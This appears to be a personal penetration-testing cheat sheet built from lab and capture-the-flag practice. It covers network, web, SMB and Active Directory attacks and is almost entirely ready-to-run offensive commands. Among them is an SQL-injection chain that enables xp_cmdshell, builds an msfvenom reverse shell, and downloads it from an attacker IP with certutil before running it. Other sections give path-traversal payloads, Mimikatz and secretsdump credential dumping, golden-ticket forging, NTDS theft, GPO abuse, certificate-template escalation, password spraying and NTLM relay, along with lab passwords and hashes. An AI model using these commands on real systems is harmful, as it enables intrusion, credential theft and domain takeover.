# Network Enumeration
```bash
sudo nmap <IP> -sC -sV -on Nmap.txt
sudo nmap <IP> -sC -sV -oG Nmap.txt
sudo nmap -A <IP>
sudo nmap -Pn -p- <IP>                #use -Pn option if you're getting nothing in the scan
sudo nmap -sV -sU <IP>
sudo nmap -sU <IP> -p 1-1000
```
#NSE
```bash
updatedb
locate .nse | grep <name>
sudo nmap --script="name" <IP>                                                                                                        #here we can specify other options like specific ports...etc
Test-NetConnection -Port <port> <IP>                                                                                                              #powershell utility
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null                                                                         #automating port scan of first 1024 ports in powershell
```

Snmp

```bash
snmpbulkwalk -c public -v2c 192.168.204.149 . > snmp.txt
```
Strings snmp.txt                                                              to extract info like user and pass

SSH enumeration
#Login
```bash
ssh uname@IP #enter password in the prompt
```

#id_rsa or id_ecdsa file
```bash
chmod 600 id_rsa/id_ecdsa
ssh uname@IP -i id_rsa/id_ecdsa                 #if it still asks for password,
```

crack them using John.                              #cracking id_rsa or id_ecdsa

```bash
ssh2john id_ecdsa(or)id_rsa > hash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
```

#bruteforce
```bash
hydra -l uname -P passwords.txt <IP> ssh         
-L  for usernames list
-l  for username 
hydra -L users.txt -P passwords.txt <IP> ssh         
```

#check for vulnerabilities associated with the version identified.

# mysql login
```bash
Mysql -u  user  -p   -P port -h host-ip
```




FTP enumeration

```bash
ftp <IP>
```

#login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password

```bash
put <file> #uploading file
get <file> #downloading file
```

#NSE
```bash
locate .nse | grep ftp
nmap -p21 --script=<name> <IP>
```

#bruteforce
```bash
hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice versa
```

# Check for vulnerabilities associated with the identified version.



# Web Enumeration
Web scanner

```bash
wapiti -u http://mailing.htb/

nikto -host $ip -o nikto.txt         #vul scanner


droopescan scan drupal http://$ip -t 32
```

checked the application stack using

```bash
 WhatWeb http://usage.htb/
```

Wordpress scanner

```bash
wpscan --url http://192.168.128.239:80 -e t,u,vp  --random-user-agent --api-token fgdfgd
wpscan --url http://$ip -e p,t,u --detection-mode aggressive > wpscan.log
wpscan --url http://192.168.128.239:80 -e u -P /usr/share/wordlists/rockyou.txt
```

basic usage
```bash
wpscan --url "target" --verbose
```
enumerate vulnerable plugins, users, vulnerable themes, timthumbs
```bash
wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log
```


Curl

```bash
curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.pub http://192.168.56.101:33414/file-upload
```


Path traversal

```bash
../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
….//….//….//….//….//….//….//….//….//….//….//….//….//….// ….//….//etc/passwd
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```



If .git found
```bash
git-dumper http://dev.linkvortex.htb/.git dump
	git status
	Git log
	Git diff 
	Git show
```
Git-Hack Tool 

SQL injection in login Form

```bash
admin'EXEC sp_configure 'xp_cmdshell',1; --
admin'EXEC sp_configure reconfigure; --
msfvenom -p windows/x64/shewindows/x64/shell_reverse_tcp ll_reverse_tcp lhost=192.168.45.181 lport=80 -f exe -o r80.exe
admin';EXEC xp_cmdshell 'certutil -urlcache -split  -f http://192.168.45.198:8002/r80.exe c:\windows\temp\r80.exe'; --
admin';EXEC xp_cmdshell 'c:\windows\temp\r80.exe'; --
```

HTTP/S enumeration
	• View the source code and identify any hidden content. If an image looks suspicious, download it and try to find hidden data in it.
	• Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
	• check /robots.txt folder
	• Look for the hostname and add the relevant one to /etc/hosts file.
	• Directory and file discovery - Obtain any hidden files that may contain juicy information


```bash
dirbuster
gobuster dir -u http://example.com -w /path/to/wordlist.txt
python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
```
	• Vulnerability Scanning using nikto: nikto -h <url>
	• HTTPSSSL certificate inspection, may reveal information like subdomains, usernames…etc
	• Default credentials: Identify the CMS or service, check for default credentials, and test them out.
	• Bruteforce


```bash
hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
```
# Use https-post-form mode for https, post, or get, which can be obtained from Burpsuite. Also, capture the response for detailed information.
#Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
	• if cgi-bin is present, then do further fuzzing and obtain files like .sh or .pl
	• Check if other services like FTP/SMB or any other that has upload privileges are getting reflected on the web.
	• API - Fuzz further, and it can reveal some sensitive information

# Fuzzing
FUZZING

subdomain
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://linkvortex.htb/ -H 'Host: FUZZ.linkvortex

ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac 

$ffuf -ac -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://board.htb -H "HOST: FUZZ.board.htb"               >>>>>>
```

directories
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/FUZZ

ffuf -ac -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -u "http://cozyhostin.htb/FUZZ"

$ffuf -ac -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.171/FUZZ" -o ffuf.txt                   >>>>>>
```


feroxbuster

```bash
feroxbuster -u http://siteisup.htb -x php
```

Gobuster

```bash
gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster vhost -u "<host>" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
```

# SMB / Active Directory
Netexec

   #enumerate shares
```bash
netexec smb CICADA-DC -u guest -p '' --shares                                                                                                                             

netexec smb CICADA-DC -u guest -p '' --rid-brute                                                                                                                            #to brute force user ids from 0 to 4000
			netexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users.txt                                     #to cut users only
```
			
#Password spray (use a password u have to try on all users)

```bash
netexec smb CICADA-DC -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success         
```                                                          

To Validate Creds

```bash
netexec smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
netexec ldap CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
netexec winrm CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
```

Get all domain hashes which stored in ntds.dit 

```bash
netexec smb 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -M ntdsutil
```



List All Users without pass ( if I have pass and want to try for each user)
```bash
lookupsid.py guest@[ip] -no-pass


impacket-lookupsid user:pass@ip

impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
lookupsid.py guest@10.10.11.35 -no-pass | grep 'SidTypeGroup' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt  
```
(3shain tgeb l users bs mn gher l data l tanya)

No login creds:
```bash
(1) impacket-lookupsid 'manager.htb/guest'@manager.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users1.txt
```


Crackmapexec

```bash
crackmapexec smb <IP/range>
crackmapexec smb 192.168.1.100 -u username -p password
```

 #enumerate shares
```bash
crackmapexec smb 192.168.1.100 -u username -p password --shares                                  
```
  
#lists users
```bash
crackmapexec smb 192.168.1.100 -u username -p password --users            
                           
crackmapexec smb 192.168.1.100 -u username -p password --all                                            #all information
crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares                        #specific port
crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares            #specific dom
```

#Inplace of username and password, we can include usernames.txt and passwords.txt for pas

Smbclient
```bash
smbclient -L //IP                                                                                                                  
smbclient //server/share
smbclient //server/share -U <username>
mbclient //server/share -U domain/username

impacket-smbclient username@domain -hashes :2385e2c9d18f87ce81bee8ba91874c5d

impacket-smbclient "<username>":"password"@192.168.20.20
impacket-smbclient ss:""@192.168.20.20
```
#shares
#use <share_name>
#ls
#mget*



SMBmap
```bash
smbmap -H <target_ip>
smbmap -H <target_ip> -u <username> -p <password>
smbmap -H <target_ip> -u <username> -p <password> -d <domain>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>
```

#Within SMB session

```bash
put <file>                    #to upload file
get <file>                    #to download file
```

• Downloading shares made easy - if the folder consists of several files, they all be downloading by this.

```bash
mask ""
recurse ON
prompt OFF
mget *
```

Active Directory

Enumeration Strategy
When facing a Windows server with so many ports, I’ll typically start working them prioritized by my comfort level. I’ll generate a tiered list, with some rough ideas of what I might look for on each:
	• Must Look AT
		○ SMB - Look for any open shares and see what I might find there.
		○ LDAP - Can I get any information without credentials?
	• If those fail
		○ Kerberos - Can I brute force usernames? If I find any, are they AS-REP-Roast-able?
		○ DNS - Can I do a zone transfer? Brute force any subdomains?
		○ RPC - Is anonymous access possible?
	• Note for creds
		○ WinRM - If I can find creds for a user in the Remote Management Users group, I can get a shell
								-----------------------------------------------------

```bash
enum4linux -a 10.10.10.161
```

Enumerate shares
```bash
netexec smb CICADA-DC -u guest -p '' --shares                                                                                                                             
crackmapexec smb 192.168.1.100 -u username -p password --shares                                  
crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares                        #specific port
crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares            #specific dom
smbmap -H 10.10.10.182 -u r.thompson -p 'rY4n5eva'
smbclient -L //[ip]/ -N 
smbclient \\\\10.10.10.182\\Data -U r.thompson        
```

To Validate Creds

```bash
netexec smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
netexec ldap CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
netexec winrm CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
nxc rdp ip172.txt -u 'yoshi' -p 'Mushroom!'                                     
```

Access sharels

```bash
smbclient //[ip]/[share] -N
```


List users
```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
lookupsid.py guest@10.10.11.35 -no-pass | grep 'SidTypeGroup' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt               ##(3shain tgeb l users bs mn gher l data l tanya)
crackmapexec smb 192.168.1.100 -u username -p password --users            
netexec smb CICADA-DC -u guest -p '' --rid-brute                                                                                                                            #to brute force user ids from 0 toev 4000
		netexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users.txt                                     #to cut users only
		
GetADUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -debug

impacket-GetADUsers -all domain/admin:password -dc-ip 10.10.x.45


python windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users                                                                            #create a list of valid users of the domain
```

Enumerate users
 
```bash
net user
net user /domain
net user $domain_user /domain
```
 
Enumerate groups
 
```bash
net group /domain
```
 
# to get  domain users that are part of local administrators group
 
```bash
net localgroup administrators
```

Authenticate with kerberos 

 set the KRB5CCNAME environment variable to point to the ticket file I want to use.

```bash
KRB5CCNAME=administrator.ccache          impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb 
```



BloodHound Python
Collection methods - database

```bash
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<Domain>' -ns '<RHOST>' -c all --zip

bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' -c all --zip --dns-timeout 30
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns '<RHOST>' -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns '<RHOST>' --dns-tcp -no-pass -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' --dns-tcp -no-pass -c all --zip
```

_________________________________________If you got errors and data couldn’t be collected______________________________________

Use both and upload both to bloodhound duplicates will be ignored

```bash
rusthound-ce -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -c All

bloodhound-ce-python -c all -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -ns 10.10.11.72
```

Modifying the rights

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'charlotte' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=SECURA,DC=YZX' 'secura.yzx'/'charlotte':'Game2On4.!'
```

Add to group

```bash
net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```

Check user added successfully

```bash
net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```

Gpo abuse

```bash
python3 pygpoabuse.py secura.yzx/charlotte:Game2On4.! -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -taskname "add admin" -dc-ip 192.168.128.97 -powershell -command " net group 'Domain Admins' charlotte /add " -f -v

gpupdate /force
```

Silver Tickets / Mimikatz snippets

Obtaining hash of an SPN user using Mimikatz 
```bash
privilege::debug 
sekurlsa::logonpasswords                                                                           #obtain NTLM hash of the SPN account here
```

Dnstool.py (krbrelayx tool)
Add/modify/delete Active Directory Integrated DNS records via LDAP.
```bash
Python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.16.6 -t A 
```

Abuse ReadGMSAPassword rights
```bash
python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'                                                                    to get service hash
```

abuse constrained delegation to request a forged ticket from the delegated service for the Administrator user

```bash
impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :c5f5537e080917d785293aeb90120854 -impersonate administrator intelligence.htb/svc_int
```


DcSync Attack

```bash
Impacket-secretsdump Administrator:"Password"@<DC_IP_Address>
Impacket-secretsdump domain/Administrator:"Password"@<DC_IP_Address>
```

Golden Tickets 


```bash
impacket-ticketer -aesKey <aesKey_of_krbtgt_account> -domain <domain_name_of_child_domain> -domain-sid <child_domain_sid> -extra-sid <parent_domain_sid>-519 Administrator -extra-pac
```

STEP 1: Get the Domain SID and NTLM hash of the krbtgt account from the output (execute this using winrim on DC02<child domain>)
```bash
	S-1-5-21-4168247447-1722543658-2110108262
	
	 <aesKey_of_krbtgt_account> :b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 or the short one start with krbtgt
	 <child_domain_sid> :  S-1-5-21-4168247447-1722543658-2110108262
```

Step2:
Get the SID for the parent domain
```bash
$parentDomain = New-Object System.Security.Principal.NTAccount("POSEIDON.yzx\Administrator") 
$parentSid = $parentDomain.Translate([System.Security.Principal.SecurityIdentifier]) 
$parentSid.Value
```

Execution 

```bash
impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid 
S-1-5-21-1190331060-1711709193-932631991-519 Administrator -extra-pac
export KRB5CCNAME=Administrator.ccache
impacket-psexec 'sub.domain.yzx/administrator@dc01.domain.yzx' -k -no-pass
```

To create a valid golden ticket, certain information is required
	NTHash of the domain controller's krbtgt account
	& domain SID.


dump NTHash for the krbtgt account

```bash
	Impacket-secretdump Administrator:"Password"@<DC_IP_Address>
```

For domain SID

```bash
	lookupsid.py EXAMPLE.local/Administrator:"Password"@<DC_IP_Address>
```

forge a golden ticket for a domain user.

```bash
	ticketer.py -nthash bf106a6860c6f7b3317c653a38aba33 -domain-sid "S-5-1-5-21-2049251289-867822404-1193079966" -domain EXAMPLE.local Alice 
```


Use the golden ticket ( smbexec or psexec or wmiexec )

```bash
psexec.py $EXAMPLE.local/$Administrator@$TARGET_NAME -target-ip $TARGET_IP -dc-ip $DC_IP -no-pass -k
```

Using Mimikatz
Location on kali :    /usr/share/windows-resources/mimikatz


```bash
cd "C:\Users\fcastle\Downloads\mimikatz_trunk\x64"
mimikatz.exe
```

# Commands
```bash
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

• Get the Domain SID and NTLM hash of the krbtgt account from the output
```bash
S-1-5-21-1796002695-2329991732-2223296958
21a84dbb8f81aa02316606b488a4a9eb
```

• Back in Mimikatz, generate the golden ticket
```bash
kerberos::golden /User:MyAdministrator /domain:marvel.local /sid:S-1-5-21-1796002695-2329991732-2223296958 /krbtgt:21a84dbb8f81aa02316606b488a4a9eb /id:500 /ptt
```
# id:500 - Administrator account
# ptt - pass the ticket into the session


# Domain SID
```bash
ps> whoami /user                                                                                         # this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-198737
```

To change password of a user

```bash
net user michael ahmed1$
```


chanAD


Change password
```bash
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"                                                                                                      U use password here

bloodyAD -d <DOMAIN> -u ' <USERNAME>' -p ':1c37d00093dc2a5f25176bf2d474afdc' --host  <DC01.DOMAIN> set password "<user to change his password>" "0xdf0xdf!"               U can use hash here w khod balk hena l hash et7at bl :

pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"                                                                               U can use hash here

net rpc password "jackie" "newP@ssword2022" -U "sub.poseidon.yzx"/"lisa" --pw-nt-hash ":905ae9b4d957545fb7b9ea0c4333247b" -S "dc02.sub.poseidon.yzx"


bloodyAD -u z.thomas -p '^1+>pdRLwyct]j,CYmyi' -d zue.corp --host 192.168.114.158 set password d.chambers 'shehab'  generic-all



rpcclient -U 'USER%PASSWORD' 192.168.x.x
rpcclient $> setuserinfo USER 23 'password123' 
rpcclient $> exit
```

Sharphound

```bash
.\SharpHound.exe -c All
```


bloodyAD

# 1. Core Enumeration (most used & important first)

# Get all users of the domain
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user    
```

# Get all computers of the domain
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type computer 
```

# Get group members
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object Users --attr member
```

# Get AD DNS records
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump     
```

# Get UserAccountControl flags for a user
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USERNAME>' --attr userAccountControl       
```

# Get AD functional level (msDS-Behavior-Version)
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr msDS-Behavior-Version    
```

# Get minimum password length policy
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr minPwdLength      
```

# Read ms-DS-MachineAccountQuota (quota for adding computer objects)
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota 
```


# 2. Privilege Escalation & Credential Access

# Read LAPS password (ms-Mcs-AdmPwd)
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd
```

# Read GMSA account password (msDS-ManagedPassword)
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword
```

# Read GMSA account password using Kerberos (dc-ip + -k)
```bash
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword 
```

# Enable DONT_REQ_PREAUTH for ASREPRoast (LDAP bind change)
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<USERNAME>' DONT_REQ_PREAUTH
```

# Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos
```bash
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac '<USERNAME>' -f DONT_REQ_PREAUTH 
```


# 3. Domain Management / Modification

# Add user to a group
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'   

bloodyAD --host "10.10.11.41" -d "certified.htb" -u "judith.mader" -p "judith09" set owner management  judith.mader
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "<owned user>" -p "newP@ssword2022" set owner  <exploitable user>  <owned user>
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "<owned user>" -p "newP@ssword2022" add genericAll <exploitable user>  <owned user>
```

# Add user to a group using Kerberos
```bash
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'   
```

# Set a password for a user (using Kerberos + dc-ip)
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>' --kerberos --dc-ip <RHOST> 
```

# Enable machine account as trusted for delegation
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<MACHINE_ACCOUNT>$' -f TRUSTED_FOR_DELEGATION 
```

# Add a computer object on behalf of a user
```bash
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer '<USERNAME>' '<PASSWORD>'
```

# Grant genericAll permissions to a specific OU for a user
```bash
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'
```

# Add a new DNS entry
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>
```

# Remove a DNS entry
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>  
```

# Enable (clear) ACCOUNTDISABLE for a user (i.e., enable account)
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac '<USERNAME>' ACCOUNTDISABLE 
```

# Enable (clear) ACCOUNTDISABLE for a user using Kerberos
```bash
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac '<USERNAME>' -f ACCOUNTDISABLE
```


# 4. SPN and Certificate Management

# Set a Service Principal Name (SPN) for a user/computer
```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName
```

# Set a Service Principal Name (SPN) using Kerberos
```bash
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName  
```

# Set a Service Principal Name (SPN) using Kerberos with explicit value
```bash
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'
```

# Set altSecurityIdentities (certificate UPN/CN) for a user using Kerberos
```bash
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -k set object '<USERNAME>' altSecurityIdentities -v 'X509:<UPN=<USERNAME>@<DOMAIN>>/CN=<CN>' 
```


Certify
https://github.com/GhostPack/Certify

```bash
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```


Certipy
https://github.com/ly4k/Certipy
https://github.com/ly4k/BloodHound/

Shadow credentials 
```bash
certipy-ad shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
```

Search Vulnerabilty
```bash
certipy find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout

certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <RHOST>
certipy-ad find -u '<USERNAME>' -p '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
```
Update UPN for a user if it is vulnerable to esc9
```bash
certipy-ad account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41
```
Account Creation
```bash
certipy-ad account create -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -dns <RHOST> -user '<COMPUTERNAME>'
```
Authentication
```bash
certipy-ad auth -u '<USERNAME>' -pfx <FILE>.pfx -dc-ip <RHOST> -domain '<DOMAIN>'
```
LDAP-Shell
```bash
certipy-ad auth -u '<USERNAME>' -pfx <FILE>.pfx -dc-ip <RHOST> -domain '<DOMAIN>' -ldap-shell
# add_user <USERNAME>
# add_user_to_group <GROUP>
```
Certificate Forging
```bash
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -template '<TEMPLATE>' -save-old
```
Certificate Request 
Run the following command twice because of a current issue with certipy.
			before that user's UPN must be changed to the original one.
```bash
certipy-ad req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41                                              

certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>' -upn '<USERNAME>@<DOMAIN>' -dns '<FQDN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>' -upn '<USERNAME>@<DOMAIN>' -dns '<FQDN>' -debug
```
Revert Changes
```bash
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -configuration <TEMPLATE>.json
```

complete methodology to steal NTDS with diskshadow: Make a file ntds.dsh on KALI 

(MAKE WITH NANO)
```bash
nano ntds.dsh
```
(FILE CONTENTS)
```bash
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
```
(RUN THIS ON KALI)
```bash
unix2dos ntds.dsh
```

 Transfer this ntds.dsh file to target. Then run this diskshadow command 

```bash
diskshadow /s ntds.dsh
```

 After this, I ran this. 

```bash
robocopy /b z:\windows\ntds . ntds.dit
reg save hklm\system C:\temp\system.hive
```

 and I had ntds.dit copied to current directory.

```bash
 impacket-secretsdump -ntds ntds.dit -system system.hive local 
```

NTLM Relay:
 1 create file Greenwolf/ntlm_theft: A tool for generating multiple types of NTLMv2 hash theft files by Jacob Wilkin (Greenwolf)
 2 impacket-ntlmrelayx -t 192.168.141.174 -smb2support

Impacket

```bash
smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share
lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target
services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] #service enumeration
secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]  #Dumping hashes on target
GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS
GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list
```

SMB enumeration

```bash
sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided
```

#NSE scripts can be used
```bash
locate .nse | grep smb
nmap -p445 --script="name" $IP 
```

#In windows we can view like this
```bash
net view \\<computername/IP> /all
```

#crackmapexec
```bash
crackmapexec smb <IP/range>  
crackmapexec smb 192.168.1.100 -u username -p password
crackmapexec smb 192.168.1.100 -u username -p password --shares #lists available shares
crackmapexec smb 192.168.1.100 -u username -p password --users #lists users
crackmapexec smb 192.168.1.100 -u username -p password --all #all information
crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares #specific port
crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain
```
#Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.

# Smbclient
```bash
smbclient -L //IP #or try with 4 /'s
smbclient //server/share
smbclient //server/share -U <username>
smbclient //server/share -U domain/username
```

#SMBmap
```bash
smbmap -H <target_ip>
smbmap -H <target_ip> -u <username> -p <password>
smbmap -H <target_ip> -u <username> -p <password> -d <domain>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>
```

#Within SMB session
